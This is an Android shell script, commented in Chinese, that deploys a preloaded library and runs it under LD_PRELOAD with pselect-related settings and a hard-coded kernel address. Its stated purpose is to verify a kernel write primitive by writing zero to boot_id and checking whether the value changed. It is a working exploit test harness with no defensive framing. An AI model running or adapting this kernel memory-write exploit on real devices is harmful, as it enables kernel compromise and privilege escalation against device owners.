#!/system/bin/sh
# mt14: 写原语验证 — 写 0 到 boot_id (唯一可读内核位置), 前后对比
SRC=/sdcard/Documents/matisse_backup_essentials/preload_mt13_v30tech.so
DST=/data/local/tmp/preload.so
LOG=/sdcard/Documents/matisse_backup_essentials/logs/mt14_test1.txt

echo "=== [1/4] 部署 ==="
rm -f $DST; cp $SRC $DST; sync
SRC_H=$(sha256sum $SRC | awk '{print $1}')
DST_H=$(sha256sum $DST | awk '{print $1}')
[ "$SRC_H" = "$DST_H" ] || { echo "❌ 哈希不一致"; exit 1; }
echo "✅ 哈希一致"

echo "=== [2/4] boot_id 前 ==="
BOOTID_BEFORE=$(cat /proc/sys/kernel/random/boot_id)
echo "before=$BOOTID_BEFORE" | tee $LOG

echo "=== [3/4] 运行 (写 0 到 boot_id) ==="
PSELECT_SHIFT=0 \
PSELECT_TREE_PC=ffffff80028a77c8 \
PSELECT_TREE_RIGHT=0 \
PSELECT_TREE_LEFT=0 \
PSELECT_PI_PARENT=0 \
PSELECT_PI_RIGHT=0 \
PSELECT_PI_LEFT=0 \
PSELECT_PAT_C0=1 \
PSELECT_ONE_SHOT=1 \
LD_PRELOAD=$DST /system/bin/sleep 60 2>&1 | tee -a $LOG

echo "=== [4/4] boot_id 后 ==="
BOOTID_AFTER=$(cat /proc/sys/kernel/random/boot_id)
echo "after=$BOOTID_AFTER" | tee -a $LOG
if [ "$BOOTID_BEFORE" != "$BOOTID_AFTER" ]; then
  echo "★ 写入落地! boot_id 已改变" | tee -a $LOG
else
  echo "写入未落地 (boot_id 未变)" | tee -a $LOG
fi
echo "=== DONE ==="
